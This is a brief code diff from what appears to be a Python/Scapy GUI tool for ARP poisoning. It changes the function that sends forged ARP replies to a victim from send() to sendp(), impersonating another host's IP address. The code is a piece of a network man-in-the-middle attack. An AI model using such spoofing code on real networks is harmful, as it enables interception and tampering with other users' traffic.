@@ -128,7 +128,7 @@ class GUI(Tk):
 		else:
 			print "Commande invalide"
 	def arpreq(self,victim,usurp,mac):#requete arp poisonning
-		respreq = send(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
+		respreq = sendp(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
 		return respreq
 		
 GUI().mainloop()
